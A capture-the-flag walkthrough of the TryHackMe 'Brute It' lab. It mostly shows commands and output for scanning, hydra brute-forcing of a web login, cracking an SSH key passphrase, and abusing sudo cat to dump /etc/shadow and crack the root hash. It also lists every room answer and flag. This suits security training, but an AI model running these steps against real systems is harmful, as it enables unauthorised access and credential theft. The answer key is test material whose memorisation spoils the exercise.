# Brute It

Learn how to brute, hash cracking and escalate privileges in this box!

[Brute It](https://tryhackme.com/room/bruteit)

## Topic's

- Network Enumeration
- Web Enumeration
- Souce Code Enumeration
- Brute Forcing (http-post-form)
- Brute Forcing (SSH)
- Misconfigure Binary (/bin/cat)
- Brute Forcing (Hash)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 About this box

In this box you will learn about:

- Brute-force
- Hash cracking
- Privilege escalation

Connect to the TryHackMe network, and deploy the machine.

Deploy the machine

`No answer needed`

## Task 2 Reconnaissance

Before attacking, let's get information about the target

Search for open ports using nmap.

```
ali@kali:~/CTFs/tryhackme/Brute It$ sudo nmap -A -sS -sC -sV -O 10.10.16.131
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 20:51 CET
Nmap scan report for 10.10.16.131
Host is up (0.069s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/14%OT=22%CT=1%CU=32911%PV=Y%DS=2%DC=T%G=Y%TM=5FB035
OS:51%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=2%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   33.70 ms 10.8.0.1
2   33.95 ms 10.10.16.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.92 seconds
```

How many ports are open?

`2`

What version of SSH is running?

`OpenSSH 7.6p1`

What version of Apache is running?

`2.4.29`

Which Linux distribution is running?

`Ubuntu`

Search for hidden directories on web server.
What is the hidden directory?

```
kali@kali:~/CTFs/tryhackme/Brute It$ gobuster dir -u 10.10.16.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.16.131
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/14 20:53:23 Starting gobuster
===============================================================
/admin (Status: 301)
Progress: 1024 / 220561 (0.46%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/11/14 20:53:33 Finished
===============================================================
```

`/admin`

[view-source:http://10.10.16.131/admin/](view-source:http://10.10.16.131/admin/)

```html
<!-- Hey john, if you do not remember, the username is admin -->
```

```
kali@kali:~/CTFs/tryhackme/Brute It$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.16.131 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -f
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-14 20:55:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.16.131:80/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid
[80][http-post-form] host: 10.10.16.131   login: admin   password: xavier
[STATUS] attack finished for 10.10.16.131 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-14 20:56:09
```

```

Hello john, finish the development of the site, here's your RSA private key.


THM{brut3_f0rce_is_e4sy}
```

```
kali@kali:~/CTFs/tryhackme/Brute It$ wget http://10.10.16.131/admin/panel/id_rsa
--2020-11-14 20:56:51--  http://10.10.16.131/admin/panel/id_rsa
Connecting to 10.10.16.131:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1766 (1.7K)
Saving to: ‘id_rsa’

id_rsa                                           100%[=======================================================================================================>]   1.72K  --.-KB/s    in 0s

2020-11-14 20:56:51 (162 MB/s) - ‘id_rsa’ saved [1766/1766]

kali@kali:~/CTFs/tryhackme/Brute It$ chmod 600 id_rsa
kali@kali:~/CTFs/tryhackme/Brute It$ ssh -i id_rsa john@10.10.16.131
The authenticity of host '10.10.16.131 (10.10.16.131)' can't be established.
ECDSA key fingerprint is SHA256:6/bVnMDQ46C+aRgroR5KUwqKM6J9jAfSYFMQIOKckug.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.16.131' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa':

kali@kali:~/CTFs/tryhackme/Brute It$ /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
kali@kali:~/CTFs/tryhackme/Brute It$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:06 DONE (2020-11-14 21:07) 0.1466g/s 2102Kp/s 2102Kc/s 2102KC/sa6_123..*7¡Vamos!
Session completed
```

```
kali@kali:~/CTFs/tryhackme/Brute It$ ssh -i id_rsa john@10.10.16.131
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov 14 20:08:33 UTC 2020

  System load:  0.16               Processes:           104
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 20%                IP address for eth0: 10.10.16.131
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$
```

```
john@bruteit:~$ cat user.txt
THM{a_password_is_not_a_barrier}
```

```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
john@bruteit:~$ sudo /bin/cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

```
john@bruteit:~$ sudo /bin/cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
```

```
kali@kali:~/CTFs/tryhackme/Brute It$ john -w=/usr/share/wordlists/rockyou.txt root.hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (?)
1g 0:00:00:00 DONE (2020-11-14 21:11) 3.571g/s 1828p/s 1828c/s 1828C/s 123456..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Task 3 Getting a shell

Find a form to get a shell on SSH.

What is the user:password of the admin panel?

`admin:xavier`

Crack the RSA key you found.
What is John's RSA Private Key passphrase?

`rockinroll`

user.txt

`THM{a_password_is_not_a_barrier}`

Web flag

`THM{brut3_f0rce_is_e4sy}`

## Task 4 Privilege Escalation

Now, we need to escalate our privileges.

Find a form to escalate your privileges.
What is the root's password?

`football`

root.txt

`THM{pr1v1l3g3_3sc4l4t10n}`
